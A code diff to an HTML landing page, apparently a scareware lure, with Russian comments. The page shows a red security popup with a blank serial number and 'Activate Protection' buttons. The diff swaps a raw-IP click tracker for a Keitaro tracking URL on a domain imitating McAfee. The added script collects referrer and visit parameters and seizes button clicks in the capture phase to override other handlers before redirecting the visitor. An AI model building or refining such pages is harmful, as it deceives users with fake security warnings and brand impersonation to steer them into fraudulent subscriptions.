@@ -7,6 +7,7 @@
   <meta name="robots" content="noindex,nofollow" />
 
   <style>
+  /* База + лэйаут */
   html { box-sizing: border-box; }
   *, *::before, *::after { box-sizing: inherit; }
   body {
@@ -19,6 +20,7 @@
     min-height: 100vh;
   }
 
+  /* Карточка */
   .popup {
     background: #fff;
     border: 1px solid #ccc;
@@ -30,6 +32,7 @@
     padding: clamp(16px, 3.5vw, 24px);
   }
 
+  /* Красная шапка */
   .popup h2 {
     background: #b91c1c;
     color: #fff;
@@ -62,6 +65,7 @@
     word-break: break-word;
   }
 
+  /* Кнопки */
   .btn, #activateBtn, #alertBtn {
     background: #b91c1c;
     color: #fff;
@@ -89,6 +93,7 @@
     .btn:hover, #activateBtn:hover, #alertBtn:hover { animation: none !important; box-shadow: none !important; }
   }
 
+  /* Размеры кнопок */
   @media (max-width: 768px) {
     .btn, #activateBtn, #alertBtn {
       display: block;
@@ -107,6 +112,7 @@
     }
   }
 
+  /* Нижний алерт */
   .footer-alert {
     position: fixed;
     bottom: -220px;
@@ -151,39 +157,6 @@
     text-align: left;
   }
   </style>
-
-  <script>
-  document.addEventListener('DOMContentLoaded', function () {
-    // Показать нижний алерт через 1.2с (как было)
-    setTimeout(() => {
-      const box = document.getElementById('alertBox');
-      if (box) box.classList.add('show');
-    }, 1200);
-
-    // --- ВАЖНО: формируем правильный Click URL с привязкой к визиту ---
-    const params = new URLSearchParams(location.search);
-    const subid = params.get('_subid') || params.get('subid') || '';
-    const CLICK_BASE = 'http://159.223.234.92/click/hWF1Y3';
-    // Пытаемся сразу передать и subid, и _subid (на разных инсталляциях по-разному)
-    const clickUrl = subid
-      ? `${CLICK_BASE}?subid=${encodeURIComponent(subid)}&_subid=${encodeURIComponent(subid)}`
-      : CLICK_BASE;
-
-    // Прописываем ссылку и страхуемся от перехватов
-    function wire(id){
-      const el = document.getElementById(id);
-      if(!el) return;
-      el.setAttribute('href', clickUrl);
-      el.addEventListener('click', function(e){
-        try{ e.stopImmediatePropagation(); }catch(_){}
-        try{ e.preventDefault(); }catch(_){}
-        window.location.assign(clickUrl);
-      }, true);
-    }
-    wire('activateBtn');
-    wire('alertBtn');
-  });
-  </script>
 </head>
 
 <body>
@@ -194,8 +167,8 @@
     <div class="serial">XXXX - XXXX - XXXX - XXXX</div>
 
     <!-- Главная кнопка -->
-    <a id="activateBtn" class="btn" href="#">
-      Activate Subscription
+    <a id="activateBtn" class="btn" href="#" target="_self" rel="nofollow noopener">
+      Activate Protection
     </a>
 
     <div class="disclaimer">
@@ -207,9 +180,57 @@
   <div class="footer-alert" id="alertBox">
     <h3>Security reminder</h3>
     <p>Regularly update your software and keep your device protected.</p>
-    <a id="alertBtn" href="#">
+    <a id="alertBtn" href="#" target="_self" rel="nofollow noopener">
       Activate Protection
     </a>
   </div>
+
+  <!-- Скрипт: показывает алерт и собирает правильный Click URL -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    // Показ нижнего алерта
+    setTimeout(() => {
+      const box = document.getElementById('alertBox');
+      if (box) box.classList.add('show');
+    }, 1200);
+
+    // Базовый Click URL (HTTPS-домен Keitaro)
+    const TRACK_BASE = 'https://trk.mcafee-software-solutions.online/hWF1Y3';
+
+    // Собираем параметры визита/источника
+    const qs = new URLSearchParams(window.location.search);
+    if (!qs.has('se_referrer')) qs.set('se_referrer', document.referrer || '');
+    if (!qs.has('default_keyword')) qs.set('default_keyword', document.title || '');
+
+    // Привязка к визиту (если есть) — берём _subid или subid, дублируем в оба
+    const subid = qs.get('_subid') || qs.get('subid') || '';
+    if (subid) {
+      qs.set('subid', subid);
+      qs.set('_subid', subid);
+    }
+
+    // Итоговая ссылка
+    const CLICK_URL = qs.toString() ? `${TRACK_BASE}?${qs.toString()}` : TRACK_BASE;
+
+    // Подписываем обе кнопки и страхуемся от перехватов клика
+    ['activateBtn','alertBtn'].forEach(id => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.setAttribute('href', CLICK_URL);
+      el.addEventListener('click', function(e){
+        try{ e.stopImmediatePropagation(); }catch(_){}
+        try{ e.preventDefault(); }catch(_){}
+        window.location.assign(CLICK_URL);
+      }, true); // capture=true — обходим чужие обработчики
+    });
+  });
+  </script>
+
+  <noscript>
+    <!-- Фолбэк без JS: просто Click URL без параметров -->
+    <p style="text-align:center;margin:20px">
+      <a href="https://trk.mcafee-software-solutions.online/hWF1Y3">Continue</a>
+    </p>
+  </noscript>
 </body>
 </html>
